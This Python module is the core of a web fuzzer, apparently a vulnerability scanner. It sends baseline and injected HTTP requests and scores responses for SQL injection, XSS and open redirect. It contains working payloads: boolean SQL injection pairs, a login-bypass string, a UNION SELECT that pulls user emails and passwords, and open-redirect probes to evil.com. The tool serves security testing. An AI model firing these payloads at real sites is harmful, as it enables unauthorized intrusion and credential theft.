# backend/modules/fuzzer_core.py
from __future__ import annotations

import json
import time
import hashlib
import statistics
from pathlib import Path
from typing import Dict, Any, List, Tuple, Optional
from urllib.parse import urlparse, urlencode, urlunparse, parse_qs, quote

import httpx
from .detectors import (
    reflection_signals,
    sql_error_signal,
    score,
    open_redirect_signal,
    time_delay_signal,
    boolean_divergence_signal,
)

TRUNCATE_BODY = 2048


# ---------------------------- small utils ------------------------------------


def _hash(s: str) -> str:
    return hashlib.sha1(s.encode("utf-8", "ignore")).hexdigest()


def _lower_headers(h: Dict[str, str]) -> Dict[str, str]:
    try:
        return {k.lower(): v for k, v in dict(h).items()}
    except Exception:
        # httpx Headers can be multi-dict; fallback
        out: Dict[str, str] = {}
        for k in h.keys():
            out[k.lower()] = h.get(k)
        return out


def _origin_host(url: str) -> str:
    try:
        return urlparse(url).netloc.lower()
    except Exception:
        return ""


def _origin_referer(url: str) -> str:
    try:
        u = urlparse(url)
        return f"{u.scheme}://{u.netloc}/" if u.scheme and u.netloc else ""
    except Exception:
        return ""


def _augment_headers(h: Dict[str, str], url: str) -> Dict[str, str]:
    """
    Add gentle browser-like defaults without clobbering provided values.
    Also nudge APIs to return JSON when likely.
    """
    out = dict(h or {})
    key = lambda k: next((kk for kk in out.keys() if kk.lower() == k.lower()), None)

    if not key("user-agent"):
        out["User-Agent"] = "Mozilla/5.0 (compatible; elise-fuzzer/1.0)"

    # Prefer JSON on /api/ or /rest/ targets; otherwise allow HTML too
    path = (urlparse(url).path or "").lower()
    wants_json = ("/api/" in path) or ("/rest/" in path)
    if not key("accept"):
        out["Accept"] = (
            "application/json, */*;q=0.8"
            if wants_json
            else "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
        )

    if not key("accept-language"):
        out["Accept-Language"] = "en-US,en;q=0.8"

    if not key("referer"):
        ref = _origin_referer(url)
        if ref:
            out["Referer"] = ref

    return out


# -------------------------- request mutation ---------------------------------


def _apply_payload_to_target(
    t: Dict[str, Any], payload: str, control: bool = False
) -> Tuple[str, Dict[str, str], Optional[str]]:
    """
    Build a concrete HTTP request for target `t` and `payload`.
    Returns (url, headers, body)
    """
    url = t["url"]
    headers = dict(t.get("headers") or {})
    body = t.get("body")

    value = t["control_value"] if control else payload
    target_param = t["target_param"]

    if t["in"] == "query":
        # Replace only the target param; keep others as-is
        u = urlparse(url)
        q = parse_qs(u.query, keep_blank_values=True)
        q[target_param] = [value]
        new_qs = urlencode(
            [(k, v) for k, vs in q.items() for v in (vs if isinstance(vs, list) else [vs])]
        )
        url = urlunparse((u.scheme, u.netloc, u.path, u.params, new_qs, u.fragment))
        body = None  # GET
    else:
        # Body parameter
        ctype = (t.get("content_type") or "").split(";")[0].strip().lower()
        if ctype == "application/json":
            try:
                data = json.loads(body) if isinstance(body, str) else (body or {})
                if not isinstance(data, dict):
                    data = {}
            except Exception:
                data = {}
            data[target_param] = value
            body = json.dumps(data)
            headers["Content-Type"] = "application/json"
        else:
            # form-urlencoded or unknown -> urlencoded
            p = parse_qs(body or "", keep_blank_values=True)
            p[target_param] = [value]
            body = urlencode(
                [(k, v) for k, vs in p.items() for v in (vs if isinstance(vs, list) else [vs])]
            )
            headers["Content-Type"] = "application/x-www-form-urlencoded"

    # So we get stable content negotiation + basic browser-like posture
    headers = _augment_headers(headers, url)
    return url, headers, body


# ------------------------------ transport ------------------------------------


def _send_once(
    client: httpx.Client,
    method: str,
    url: str,
    headers: Dict[str, str],
    body: Optional[str],
    timeout: float,
):
    try:
        if method.upper() == "GET":
            t0 = time.time()
            r = client.get(url, headers=headers, timeout=timeout)
            t1 = time.time()
        else:
            content = body.encode("utf-8") if isinstance(body, str) else body
            t0 = time.time()
            r = client.request(method.upper(), url, headers=headers, content=content, timeout=timeout)
            t1 = time.time()
        return r, None, (t1 - t0)
    except Exception as e:
        return None, {"type": type(e).__name__, "message": str(e)}, 0.0


def _send(
    client: httpx.Client,
    method: str,
    url: str,
    headers: Dict[str, str],
    body: Optional[str],
    timeout: float,
    repeats: int = 1,
):
    """
    Send the same request `repeats` times (for timing probes) and return:
    - last response (or None)
    - last error (or None)
    - list of elapsed seconds for each try
    """
    last_resp, last_err = None, None
    samples: List[float] = []
    for _ in range(max(1, repeats)):
        resp, err, elapsed = _send_once(client, method, url, headers, body, timeout)
        last_resp, last_err = resp, err
        samples.append(elapsed)
        if err is not None:
            # still keep timing sample (0.0) to maintain length
            continue
    return last_resp, last_err, samples


# ------------------------------- payloads ------------------------------------


def _looks_time_based(payload: str) -> bool:
    p = (payload or "").lower()
    return any(k in p for k in ("waitfor", "sleep(", "pg_sleep", "benchmark(", "dbms_lock.sleep"))


def _payload_family(p: str) -> str:
    """Lightweight classifier so the UI can show both payload class and signal family."""
    s = (p or "").lower()
    if any(x in s for x in ("<script", "<svg", "onerror=", "<img")):
        return "xss"
    if any(x in s for x in (" union ", " or ", " and ", "waitfor delay", "'--", "/*")) or s.startswith("'"):
        return "sqli"
    if s.startswith(("http://", "https://", "//")) or "%2f%2f" in s:
        return "redirect"
    return "base"


def _boolean_pairs_for(t: Dict[str, Any]) -> List[Tuple[str, str]]:
    """
    Generate conservative boolean TRUE/FALSE pairs regardless of context.
    We include quoted and unquoted variants to cover both string/number sinks.
    """
    pairs: List[Tuple[str, str]] = []

    # Quoted (string) style
    pairs.append(("' OR '1'='1' -- ", "' OR '1'='2' -- "))
    pairs.append(("') OR ('1'='1' -- ", "') OR ('1'='2' -- "))
    pairs.append(('") OR ("1"="1" -- ', '") OR ("1"="2" -- '))

    # Unquoted (numeric) style
    pairs.append(("1 OR 1=1 -- ", "1 AND 1=2 -- "))
    pairs.append((") OR (1=1) -- ", ") AND (1=2) -- "))

    # URL-encoded variants (cheap coverage for query)
    pairs.append((quote("' OR '1'='1' -- "), quote("' OR '1'='2' -- ")))
    pairs.append((quote("1 OR 1=1 -- "), quote("1 AND 1=2 -- ")))

    # Deduplicate
    seen = set()
    out: List[Tuple[str, str]] = []
    for a, b in pairs:
        key = (a, b)
        if key not in seen:
            out.append((a, b))
            seen.add(key)
    return out


def _generate_context_aware_payloads(t: Dict[str, Any]) -> List[str]:
    """
    Merge user-provided payloads with minimal context-aware probes so
    we can trigger real oracles without depending on pre-curated lists.
    """
    base = list(dict.fromkeys((t.get("payloads") or [])))  # dedupe, keep order
    auto: List[str] = []
    param = (t.get("target_param") or "").lower()
    url = t.get("url") or ""
    location = t.get("in")

    # JSON login bypass (typical)
    ctype = (t.get("content_type") or "").split(";")[0].strip().lower()
    looks_like_login = ("login" in url.lower()) or (param in ("email", "username", "user", "login"))
    if ctype == "application/json" and looks_like_login and location != "query":
        auto += ["' OR '1'='1' -- ", "' OR '1'='2' -- "]

    # Basic SQL error / boolean probes for search-like params
    if location == "query" and param in ("q", "query", "search", "s"):
        extra = [
            "'",  # error probe
            "') AND 1=1--",
            "') AND 1=2--",
            '") AND 1=1--',
            '") AND 1=2--',
            ") AND 1=1--",
            ") AND 1=2--",
        ]
        extra += [quote("') AND 1=1--", safe=""), quote("') AND 1=2--", safe="")]
        auto += extra
        # Opportunistic UNION (Juice Shop-like)
        auto += ["qwert')) UNION SELECT id, email, password, '4','5','6','7','8','9' FROM Users--"]

    # Open-redirect probes
    if location == "query" and param in (
        "to",
        "url",
        "next",
        "redirect",
        "return",
        "continue",
        "return_to",
        "redirect_uri",
        "callback",
    ):
        auto += [
            "http://evil.com",
            "https://evil.com",
            "//evil.com",
            "https:////evil.com",
            "http://evil.com@allowed.com",
            "https://allowed.com@evil.com",
            "%2f%2fevil.com",
        ]

    # Deduplicate but preserve order: base first, then auto, without repeats
    seen = set()
    out: List[str] = []
    for p in base + auto:
        if p not in seen:
            out.append(p)
            seen.add(p)
    return out


# -------------------------- inference (local) --------------------------------


def _make_detector_hits(
    refl: Dict[str, Any],
    sqlerr: bool,
    openredir: bool,
    time_sqli: bool,
    boolean_sqli: bool,
    hash_changed: bool,
    repeat_consistent: bool,
) -> Dict[str, bool]:
    """Flattened booleans for UI & inference."""
    return {
        "xss_raw": bool(refl.get("raw")),
        "xss_html_escaped": bool(refl.get("html_escaped")),
        "xss_js": bool(refl.get("js_context")),
        "sql_error": bool(sqlerr),
        "open_redirect": bool(openredir),
        "time_sqli": bool(time_sqli),
        "boolean_sqli": bool(boolean_sqli),
        "hash_changed": bool(hash_changed),
        "repeat_consistent": bool(repeat_consistent),
    }


def _infer_class(hits: Dict[str, bool], status_delta: int, len_delta: int) -> str:
    """
    Deterministic, conservative inference.
    """
    if hits.get("sql_error") or hits.get("boolean_sqli") or hits.get("time_sqli"):
        return "sqli"
    if hits.get("xss_js"):
        return "xss"
    if hits.get("xss_raw") and not hits.get("xss_html_escaped"):
        return "xss"
    if hits.get("open_redirect"):
        return "open_redirect"
    if abs(len_delta) > 300 and status_delta >= 1:
        return "suspicious"
    return "none"


def _append_evidence_line(fout, obj: Dict[str, Any]) -> None:
    fout.write(json.dumps(obj, ensure_ascii=False) + "\n")


# ------------------------------ attempts utils --------------------------------


def _attempt_request(
    client: httpx.Client,
    method: str,
    url: str,
    headers: Dict[str, str],
    body: Optional[str],
    timeout: float,
    repeats: int,
) -> Tuple[Optional[httpx.Response], Optional[Dict[str, str]], List[float]]:
    return _send(client, method, url, headers, body, timeout, repeats=repeats)


def _response_core(resp: httpx.Response) -> Tuple[str, str, int]:
    """Return (full_text, snippet, status)."""
    body_full = resp.text or ""
    snippet = body_full[:TRUNCATE_BODY]
    return body_full, snippet, resp.status_code


# --------------------------------- main --------------------------------------


def run_fuzz(job_dir: Path, targets_path: Path, out_dir: Optional[Path] = None) -> Path:
    """
    Executes control vs injected requests for each target param.
    Writes evidence to <job_dir>/results/evidence.jsonl
    """
    targets_obj = json.loads(targets_path.read_text("utf-8"))
    targets: List[Dict[str, Any]] = targets_obj.get("targets", [])

    results_dir = (out_dir or job_dir / "results")
    results_dir.mkdir(parents=True, exist_ok=True)
    evidence_path = results_dir / "evidence.jsonl"

    # We want 3xx Location for open-redirect detection -> don't auto-follow
    with httpx.Client(follow_redirects=False) as client, evidence_path.open("w", encoding="utf-8") as fout:
        for t in targets:
            method = t["method"].upper()
            timeout = float(t.get("timeout", 12.0))

            # CONTROL (baseline)
            u_ctrl, h_ctrl, b_ctrl = _apply_payload_to_target(t, t["control_value"], control=True)
            r0, err0, samples0 = _attempt_request(client, method, u_ctrl, h_ctrl, b_ctrl, timeout, repeats=1)

            if err0 is not None:
                # Log baseline transport failure and skip this target
                _append_evidence_line(
                    fout,
                    {
                        "type": "baseline_error",
                        "job": job_dir.name,
                        "target_id": t["id"],
                        "method": method,
                        "in": t["in"],
                        "param": t["target_param"],
                        "url": u_ctrl,
                        "headers": h_ctrl,
                        "body": b_ctrl,
                        "error": err0,
                    },
                )
                continue

            # Baseline success -> record it
            body0_full, body0_snip, s0 = _response_core(r0)  # type: ignore[arg-type]
            l0 = len(body0_snip)
            baseline_hash = _hash(body0_snip)
            baseline_ms = int(statistics.median(samples0) * 1000)

            _append_evidence_line(
                fout,
                {
                    "type": "baseline",
                    "job": job_dir.name,
                    "target_id": t["id"],
                    "method": method,
                    "in": t["in"],
                    "param": t["target_param"],
                    "url": u_ctrl,
                    "headers": h_ctrl,
                    "body": b_ctrl,
                    "status": s0,
                    "length": len(body0_full),
                    "elapsed_ms": baseline_ms,
                    "timing_samples_ms": [int(s * 1000) for s in samples0],
                    "response_hash": baseline_hash,
                },
            )

            origin = _origin_host(t["url"] or "")

            # -------------------- BOOLEAN-PAIR ORACLE PASS --------------------
            seen_payloads: set[str] = set()
            for p_true, p_false in _boolean_pairs_for(t):
                # TRUE
                u_t, h_t, b_t = _apply_payload_to_target(t, p_true, control=False)
                r_t, err_t, smp_t = _attempt_request(client, method, u_t, h_t, b_t, timeout, repeats=1)
                if err_t is None and r_t is not None:
                    body_t_full, body_t_snip, st_t = _response_core(r_t)
                    len_t = len(body_t_snip)
                    hash_t = _hash(body_t_snip)
                    elapsed_t = int(statistics.median(smp_t) * 1000)
                else:
                    body_t_full, body_t_snip, st_t = "", "", 0
                    len_t, hash_t, elapsed_t = 0, "", 0

                # FALSE
                u_f, h_f, b_f = _apply_payload_to_target(t, p_false, control=False)
                r_f, err_f, smp_f = _attempt_request(client, method, u_f, h_f, b_f, timeout, repeats=1)
                if err_f is None and r_f is not None:
                    body_f_full, body_f_snip, st_f = _response_core(r_f)
                    len_f = len(body_f_snip)
                    hash_f = _hash(body_f_snip)
                    elapsed_f = int(statistics.median(smp_f) * 1000)
                else:
                    body_f_full, body_f_snip, st_f = "", "", 0
                    len_f, hash_f, elapsed_f = 0, "", 0

                # Log attempts
                for (lbl, uX, hX, bX, stX, bodyX_full, bodyX_snip, elapsedX, smpX, errX, pX) in [
                    ("attempt", u_t, h_t, b_t, st_t, body_t_full, body_t_snip, elapsed_t, smp_t, err_t, p_true),
                    ("attempt", u_f, h_f, b_f, st_f, body_f_full, body_f_snip, elapsed_f, smp_f, err_f, p_false),
                ]:
                    _append_evidence_line(
                        fout,
                        {
                            "type": "attempt" if errX is None else "attempt_error",
                            "job": job_dir.name,
                            "target_id": t["id"],
                            "method": method,
                            "in": t["in"],
                            "param": t["target_param"],
                            "url": uX,
                            "headers": hX,
                            "body": bX,
                            "payload_string": pX,
                            "payload_family_used": _payload_family(pX),
                            "status": stX,
                            "length": len(bodyX_full),
                            "elapsed_ms": elapsedX,
                            "timing_samples_ms": [int(s * 1000) for s in smpX],
                            "response_hash": _hash(bodyX_snip),
                            **({"error": errX} if errX is not None else {}),
                        },
                    )

                # Compute boolean divergence
                metrics_true = {"status": st_t, "len": len_t, "hash": hash_t}
                metrics_false = {"status": st_f, "len": len_f, "hash": hash_f}
                boolean_hit = boolean_divergence_signal(metrics_true, metrics_false)

                if boolean_hit:
                    # Build findings line for the pair
                    status_delta_pair = abs(st_t - st_f)
                    len_delta_pair = abs(len_t - len_f)
                    ms_delta_pair = abs(elapsed_t - elapsed_f)

                    findings = {
                        "reflection": {},           # not relevant here
                        "sql_error": False,
                        "open_redirect": False,
                        "boolean_sqli": True,
                        "time_sqli": False,
                        "hash_changed": (hash_t != hash_f),
                        "repeat_consistent": True,
                    }
                    conf_pair = score(findings, status_delta_pair, len_delta_pair, ms_delta_pair)

                    _append_evidence_line(
                        fout,
                        {
                            "type": "finding",
                            "oracle": "boolean_pair",
                            "job": job_dir.name,
                            "target_id": t["id"],
                            "method": method,
                            "in": t["in"],
                            "param": t["target_param"],
                            "url": t["url"],
                            "content_type": t.get("content_type"),
                            "payload_true": p_true,
                            "payload_false": p_false,
                            "detector_hits": {
                                "boolean_sqli": True,
                            },
                            "inferred_vuln_class": "sqli",
                            "status_delta": status_delta_pair,
                            "len_delta": len_delta_pair,
                            "latency_ms_delta": ms_delta_pair,
                            "confidence": conf_pair,
                            "request_true": {"url": u_t, "headers": h_t, "body": b_t},
                            "request_false": {"url": u_f, "headers": h_f, "body": b_f},
                            "response_true": {"status": st_t, "length": len(body_t_full), "elapsed_ms": elapsed_t},
                            "response_false": {"status": st_f, "length": len(body_f_full), "elapsed_ms": elapsed_f},
                        },
                    )

                # Avoid double-processing these in the generic loop
                seen_payloads.add(p_true)
                seen_payloads.add(p_false)

            # -------------------- GENERIC PAYLOAD LOOP --------------------
            payloads = _generate_context_aware_payloads(t)
            for payload in payloads:
                if payload in seen_payloads:
                    continue  # skip ones already used for boolean pairs

                u1, h1, b1 = _apply_payload_to_target(t, payload, control=False)

                # Time-based probes: take median of 3 attempts
                repeats = 3 if _looks_time_based(payload) else 1
                r1, err1, samples = _attempt_request(client, method, u1, h1, b1, timeout, repeats=repeats)

                # Always write an attempt line, even if transport failed
                if err1 is not None:
                    _append_evidence_line(
                        fout,
                        {
                            "type": "attempt_error",
                            "job": job_dir.name,
                            "target_id": t["id"],
                            "method": method,
                            "in": t["in"],
                            "param": t["target_param"],
                            "payload_string": payload,
                            "payload_family_used": _payload_family(payload),
                            # legacy for back-compat
                            "payload": payload,
                            "url": u1,
                            "headers": h1,
                            "body": b1,
                            "error": err1,
                            "timing_samples_ms": [int(s * 1000) for s in samples],
                        },
                    )
                    continue

                # Bodies & headers
                body1_full, body1_snip, status1 = _response_core(r1)  # type: ignore[arg-type]
                resp_headers = _lower_headers(r1.headers)

                # Signals
                refl = reflection_signals(body1_full, payload)
                sqlerr = sql_error_signal(body1_full)

                # Open-redirect: use detectors helper (needs Location + origin)
                loc_hdr = resp_headers.get("location")
                openredir = bool(open_redirect_signal(loc_hdr, origin))

                # Time-delay oracle (only meaningful if we purposely sent a time payload)
                elapsed_ms_median = int(statistics.median(samples) * 1000)
                baseline_ms = baseline_ms  # same var
                time_sqli = _looks_time_based(payload) and time_delay_signal(baseline_ms, elapsed_ms_median)

                # Hash / consistency
                attempt_hash = _hash(body1_snip)
                hash_changed = attempt_hash != baseline_hash
                repeat_consistent = (len(samples) >= 2) and (statistics.pstdev(samples) * 1000.0 <= 200.0)

                # Deltas vs baseline
                status_delta = abs((status1 or 0) - s0)
                len_delta = abs(len(body1_snip) - l0)
                ms_delta = max(0, elapsed_ms_median - baseline_ms)

                # Flatten detector hits (booleans)
                detector_hits = _make_detector_hits(
                    refl,
                    sqlerr,
                    openredir,
                    time_sqli,
                    boolean_sqli=False,  # handled in the pair pass above
                    hash_changed=hash_changed,
                    repeat_consistent=repeat_consistent,
                )

                # Confidence
                conf = score(
                    {
                        "reflection": refl,
                        "sql_error": sqlerr,
                        "open_redirect": openredir,
                        "boolean_sqli": False,
                        "time_sqli": time_sqli,
                        "hash_changed": hash_changed,
                        "repeat_consistent": repeat_consistent,
                    },
                    status_delta,
                    len_delta,
                    ms_delta,
                )

                # Inferred class (deterministic)
                inferred = _infer_class(detector_hits, status_delta, len_delta)

                # Always log the attempt (trace)
                _append_evidence_line(
                    fout,
                    {
                        "type": "attempt",
                        "job": job_dir.name,
                        "target_id": t["id"],
                        "method": method,
                        "in": t["in"],
                        "param": t["target_param"],
                        "url": u1,
                        "headers": h1,
                        "body": b1,
                        # New clear fields
                        "payload_string": payload,
                        "payload_family_used": _payload_family(payload),
                        "detector_hits": detector_hits,
                        "inferred_vuln_class": inferred,
                        # Legacy fields to avoid breaking current UI
                        "payload": payload,
                        "signals": {
                            "reflection": refl,
                            "sql_error": sqlerr,
                            "open_redirect": {
                                "location": loc_hdr,
                                "external": openredir,
                            },
                        },
                        # Response meta & deltas
                        "status": status1,
                        "length": len(body1_full),
                        "elapsed_ms": elapsed_ms_median,
                        "timing_samples_ms": [int(s * 1000) for s in samples],
                        "status_delta": status_delta,
                        "len_delta": len_delta,
                        "latency_ms_delta": ms_delta,
                        # Scoring
                        "confidence": conf,
                        # Evidence
                        "response_hash": attempt_hash,
                        "response_snippet": body1_snip,
                    },
                )

                # Findings (high-signal) — lower threshold a bit for JSON responses
                resp_ct = (resp_headers.get("content-type") or "").lower()
                threshold = 0.5 if "application/json" in resp_ct else 0.6
                should_record = (
                    conf >= threshold
                    or detector_hits.get("sql_error")
                    or detector_hits.get("xss_js")
                    or detector_hits.get("xss_raw")
                    or detector_hits.get("open_redirect")
                    or detector_hits.get("time_sqli")
                )
                if should_record:
                    ev_top = {
                        "job": job_dir.name,
                        "target_id": t["id"],
                        "method": method,
                        "in": t["in"],
                        "param": t["target_param"],
                        "url": t["url"],  # original target URL
                        "content_type": t.get("content_type"),
                        "payload_string": payload,
                        "payload_family_used": _payload_family(payload),
                        "detector_hits": detector_hits,
                        "inferred_vuln_class": inferred,
                        # Legacy
                        "payload": payload,
                        "control_value": t["control_value"],
                        "status": status1,
                        "status_delta": status_delta,
                        "len_delta": len_delta,
                        "latency_ms_delta": ms_delta,
                        "confidence": conf,
                        "response_hash": attempt_hash,
                        "response_snippet": body1_snip,
                    }

                    ev_norm = {
                        "request": {
                            "method": method,
                            "url": u1,  # the actual mutated URL we sent
                            "param": t["target_param"],
                            "headers": h1,
                            "body": b1,
                        },
                        "response": {
                            "status": status1,
                            "length": len(body1_full),
                            "elapsed_ms": elapsed_ms_median,
                            "headers": {
                                # keep a small, useful subset
                                "content-type": resp_headers.get("content-type"),
                                "location": resp_headers.get("location"),
                                "set-cookie": resp_headers.get("set-cookie"),
                            },
                        },
                    }

                    ev = {**ev_top, **ev_norm, "type": "finding"}
                    _append_evidence_line(fout, ev)

    return evidence_path
